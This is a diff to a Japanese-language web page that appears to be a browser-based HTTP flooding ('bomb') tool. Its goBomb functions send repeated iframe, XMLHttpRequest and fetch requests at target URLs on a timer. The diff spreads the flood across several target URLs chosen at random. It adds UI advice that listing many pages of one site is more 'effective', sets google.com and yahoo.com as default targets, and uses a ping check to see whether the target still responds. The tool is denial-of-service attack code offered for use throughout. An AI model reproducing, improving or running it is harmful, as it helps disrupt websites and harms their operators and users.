@@ -32,7 +32,8 @@
 	var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
 	var IsUrlVaild;
 	var IsPostdataVaild;
-
+    var targetsurl, targetsurlLength, spicifiedurl;
+    // const randRange = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
 	//変数の一斉定義(boonv3.7から流用)--------------------------------------------
 
 var i,iwc,wch,wch_url;
@@ -347,6 +348,8 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 		m_inInterval = document.m_form1.m_tbInterval.value;
 		m_inWinNum = document.m_form1.m_tbWinNum.value;
 		m_stBomburl = document.m_form1.m_tbUrl.value;
+        targetsurl = m_stBomburl.split("\n").filter(Boolean);
+		// targetsurlLength = targetsurl.length - 1
 		postdata_from_user = document.m_form1.postdata_from_user.value;
 		http_method = document.m_form1.SELECT.value;
 		m_inCount = 0;
@@ -400,9 +403,10 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 
 	function goBomb() 
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//ifFrame更新
 			m_ifFrame[i].setAttribute("src", bomb);
 			//XMLHttpRequest_GET
@@ -423,9 +427,10 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 
 	function goBomb_GET_ONLY() 
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//ifFrame更新
 			m_ifFrame[i].setAttribute("src", bomb);
 		}
@@ -470,10 +475,11 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 
 	function goBomb_nowild()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		var postdata = postdata_from_user;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//ifFrame（窓）更新
 			m_ifFrame[i].setAttribute("src", bomb);
 			//XMLHttpRequest_GET
@@ -495,9 +501,10 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 
 function goBomb_nowild_GET_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//ifFrame（窓）更新
 			m_ifFrame[i].setAttribute("src", bomb);
 		}
@@ -548,6 +555,8 @@ function goBomb_nowild_GET_ONLY()
 		m_inInterval = document.m_form1.m_tbInterval.value;
 		m_inWinNum = document.m_form1.m_tbWinNum.value;
 		m_stBomburl = document.m_form1.m_tbUrl.value;
+        targetsurl = m_stBomburl.split("\n").filter(Boolean);
+		// targetsurlLength = targetsurl.length - 1
 		postdata_from_user = document.m_form1.postdata_from_user.value;
 		http_method = document.m_form1.SELECT.value;
 		m_inCount = 0;
@@ -573,9 +582,10 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_XML()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//XMLHttpRequest
 			xhr2.open(method2, bomb, async);
 	  		xhr2.setRequestHeader("Pragma", "no-cache");
@@ -596,12 +606,13 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_XML_GET_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//XMLHttpRequest
 			xhr2.open(method2, bomb, async);
-	  	xhr2.setRequestHeader("Pragma", "no-cache");
+	  	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
@@ -615,9 +626,10 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_XML_POST_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
  			//XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
 			xhr.setRequestHeader("Content-Type", "application/json;charset=utf-8");
@@ -635,7 +647,7 @@ function goBomb_nowild_GET_ONLY()
 			//XMLHttpRequest
 			bomb_url = convurl_url(1)
 			xhr2.open(method2, bomb_url, async);
-	  	xhr2.setRequestHeader("Pragma", "no-cache");
+	  	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
@@ -659,7 +671,7 @@ function goBomb_nowild_GET_ONLY()
 			//XMLHttpRequest
 			bomb_url = convurl_url(1)
 			xhr2.open(method2, bomb_url, async);
-	  	xhr2.setRequestHeader("Pragma", "no-cache");
+	  	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
@@ -688,13 +700,14 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_XML_nowild()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		var postdata = postdata_from_user;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//XMLHttpRequest
 			xhr2.open(method2, bomb, async);
-	  	xhr2.setRequestHeader("Pragma", "no-cache");
+	  	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
@@ -712,12 +725,13 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_XML_nowild_GET_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//XMLHttpRequest
 			xhr2.open(method2, bomb, async);
-	  	xhr2.setRequestHeader("Pragma", "no-cache");
+	  	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
@@ -731,10 +745,11 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_XML_nowild_POST_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		var postdata = postdata_from_user;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
  			//XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
 			xhr.setRequestHeader("Content-Type", "application/json;charset=utf-8");
@@ -810,6 +825,8 @@ function goBomb_nowild_GET_ONLY()
 		m_inInterval = document.m_form1.m_tbInterval.value;
 		m_inWinNum = document.m_form1.m_tbWinNum.value;
 		m_stBomburl = document.m_form1.m_tbUrl.value;
+        targetsurl = m_stBomburl.split("\n").filter(Boolean);
+		// targetsurlLength = targetsurl.length - 1
 		postdata_from_user = document.m_form1.postdata_from_user.value;
 		http_method = document.m_form1.SELECT.value;
 		m_inCount = 0;
@@ -836,9 +853,10 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_fetch()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//fetch GET
 			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
@@ -852,9 +870,10 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_fetch_GET_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//fetch GET
 			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
@@ -865,9 +884,10 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_fetch_POST_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//fech POST
 			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
 			fetch(req2);
@@ -923,10 +943,11 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_fetch_nowild()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		var postdata = postdata_from_user;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//fetch GET
 			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
@@ -940,9 +961,10 @@ function goBomb_nowild_GET_ONLY()
 
 	function goBomb_fetch_nowild_GET_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//fetch GET
 			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
@@ -953,10 +975,11 @@ function goBomb_nowild_GET_ONLY()
 
 function goBomb_fetch_nowild_POST_ONLY()
 	{
-		var bomb = m_stBomburl;
+		var bomb;
 		var postdata = postdata_from_user;
 		for(i = 0; i < m_inWinNum; i++)
 		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
 			//fech POST
 			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
 			fetch(req2);
@@ -1018,8 +1041,8 @@ function goBomb_fetch_nowild_POST_ONLY()
 		for(i = 0; i < count; i++) {
 			clearTimeout(m_toDoing_fetch);
 		}
-		document.all.m_taInfo.value += "\n\n";
-		document.all.m_taInfo.value += "～開始3(fetch)での訪問を中止しました～";
+		document.all.m_taInfo.value += "\n";
+		document.all.m_taInfo.value += "[-]開始3(fetch)での訪問を中止しました";
 	}
 
 	async function stopBomb_XML()
@@ -1027,8 +1050,8 @@ function goBomb_fetch_nowild_POST_ONLY()
 		for(i = 0; i < count; i++) {
 			clearTimeout(m_toDoing_XML);
 		}
-		document.all.m_taInfo.value += "\n\n";
-		document.all.m_taInfo.value += "～開始2(XML)での訪問を中止しました～";
+		document.all.m_taInfo.value += "\n";
+		document.all.m_taInfo.value += "[-]開始2(XML)での訪問を中止しました";
 	}
 
 	async function stopBomb_normal()
@@ -1036,15 +1059,15 @@ function goBomb_fetch_nowild_POST_ONLY()
 		for(i = 0; i < count; i++) {
 			clearTimeout(m_toDoing);
 		}
-		document.all.m_taInfo.value += "\n\n";
-		document.all.m_taInfo.value += "～開始1での訪問を中止しました～";
+		document.all.m_taInfo.value += "\n";
+		document.all.m_taInfo.value += "[-]開始1での訪問を中止しました";
 	}
 
 	function bombCounter()
 	{
 		var stInfoTmp;
 		m_inCount++;
-		stInfoTmp = "～訪問しています～\n";
+		stInfoTmp = "[+]訪問しています\n";
 		stInfoTmp += "モード  :" + attackmode + "\n";
 		stInfoTmp += "対象URL: " + convurl_url(1) + "\n";
 		stInfoTmp += "POSTDATA: " + convurl(1) + "\n";
@@ -1074,8 +1097,10 @@ function goBomb_fetch_nowild_POST_ONLY()
 	
 	function PingCheck() {
 		m_stBomburl = document.m_form1.m_tbUrl.value;
-		url_pingRequest = "https://check-host.net/check-ping?host=" + m_stBomburl + "&max_nodes=10";
-	fetch(url_pingRequest, {headers: {Accept: "application/json"}})
+        targetsurl = m_stBomburl.split("\n").filter(Boolean);
+        bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+		url_pingRequest = "https://check-host.net/check-ping?host=" + bomb + "&max_nodes=10";
+	    fetch(url_pingRequest, {headers: {Accept: "application/json"}})
     	.then(response => response.text())
     	.then(data => {
         const parsed = JSON.parse(data);
@@ -1085,8 +1110,8 @@ function goBomb_fetch_nowild_POST_ONLY()
     });
 }
 	function GetPingResult() {
-	console.log("GetPingResult was loaded!");
-	fetch(url_pingRequest2, {headers: {Accept: "application/json"}})
+	    console.log("GetPingResult loaded!");
+	    fetch(url_pingRequest2, {headers: {Accept: "application/json"}})
         .then(response => response.text())
         .then(data => {
         data_seikei = JSON.parse(data);
@@ -1094,6 +1119,10 @@ function goBomb_fetch_nowild_POST_ONLY()
 		console.log(data);
         console.log(result);
         document.all.urlInfo.value += "\n\n";
+        document.all.urlInfo.value += "次のサイトの応答結果: '" + bomb + "'";
+		document.all.urlInfo.value += "\n";
+		document.all.urlInfo.value += "---------------------------------------------"
+		document.all.urlInfo.value += "\n";
         document.all.urlInfo.value += result;
     });
 
@@ -1116,6 +1145,17 @@ function goBomb_fetch_nowild_POST_ONLY()
 		document.all.m_taInfo.value="";
 		document.all.m_taInfo.value += "※ここに情報が表示されます。";
 	}
+
+    function debug1() {
+        m_stBomburl = document.m_form1.m_tbUrl.value;
+        targetsurl = m_stBomburl.split("\n").filter(Boolean);
+		targetsurlLength = targetsurl.length - 1
+        bomb = targetsurl[randRange(0, targetsurlLength)];
+        postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		wildcard_detect(postdata_from_user, m_stBomburl);
+        console.log("m_stBomburl: " + m_stBomburl + "\n" + "targetsurl: " + targetsurl + "\n" + "targetsurlLength: " + targetsurlLength + "\n" + "bomb: " + bomb + "\n" + "http_method: " + http_method);
+    }
 
 </script>
 
@@ -1520,7 +1560,12 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
       <div class="content">
 				<ul>
 					<li>訪問したいサイトのURLをhttpsから入力してください。</li>
+                    <li>複数行入力できます。同じサイト上にある複数のページurlを入力すると効果的です</li>
 				</ul>
+                <b>例: https://www.mokuhyo.comにa.htmlとb.htmlとc.htmlというページある場合次のように入力</b>
+				<b>https://www.mokuhyo.com/a.html</b>
+				<b>https://www.mokuhyo.com/b.html</b>
+				<b>https://www.mokuhyo.com/c.html</b>
 			</div>
     </details>
   </div>
@@ -1614,7 +1659,7 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
     <details>
       <summary>
         <span class="summary_inner">
-          [訪問モードについて]<span class="icon"></span>
+          [開始ボタンについて]<span class="icon"></span>
         </span>
       </summary>
       <div class="content">   
@@ -1648,31 +1693,31 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
       </summary>
       <div class="content">   
         <ul>
-        	<b>&lt; = a~z</b>
+        	<b>&lt;</b>
         	<br>
         	<li>[解説] 小文字のアルファベットa~zの中からランダム</li>
         	<br>
-        	<b>&gt; = A~Z</b>
+        	<b>&gt;</b>
         	<br>
         	<li>[解説] 大文字のアルファベットA~Zの中からランダム</li>
         	<br>
-        	<b>! = 0~9</b>
+        	<b>!</b>
         	<br>
         	<li>[解説] 0~9の整数中からランダム</li>
         	<br>
-        	<b>( = 0~f</b>
+        	<b>(</b>
         	<br>
         	<li>[解説] 小文字のアルファベットを含む16進数の中からランダム</li>
         	<br>
-        	<b>) = 0~F</b>
+        	<b>)</b>
         	<br>
         	<li>[解説] 大文字のアルファベットを含む16進数の中からランダム</li>
         	<br>
-        	<b>[0-1] = 0~1</b>
+        	<b>[0-1]</b>
         	<br>
         	<li>[解説] 0~1の中からランダム。例えば[3-5]とすれば3~5の中からランダム。</li>
         	<br>
-        	<b>\\ = bypass</b>
+        	<b>\\</b>
         	<br>
         	<li>[解説] \を入力したいとき。</li>
         	<br>
@@ -1737,11 +1782,12 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
 	<input type="radio" style="transform: scale(1.5);" id="POSTONLY-MODE" name="SELECT" value="3" onclick="post_input_disabler(this.checked);">
 	<label for="inq3">POSTだけ</label>
 </p>
-<br>
-<b>【対象URL】</b><br>
+<b>【対象URL】※複数行入力可能</b><br>
 Wildcard:<input type="checkbox" name="wcc_url" style="transform: scale(1.5);" title="チェックでワイルドカードを使用します。">
 <br>
-<input class="css-button-rounded--black" type="text" name="m_tbUrl" size=55 value="https://www.google.com">
+<textarea class="css-button-rounded--black" type="text" rows="30" cols="90" name="m_tbUrl" size="55">https://www.google.com
+https://www.yahoo.com</textarea>
+<br>
 <input class="css-button-rounded--black" type="button" value="PingCheck" style="color: yellow;" onclick="HttpCheck();">
 <br>
 
@@ -1772,7 +1818,3 @@ Wildcard:<input type="checkbox" name="wcc" style="transform: scale(1.5);" title=
 </div>
 </div>
 </body>
-
-
-
-
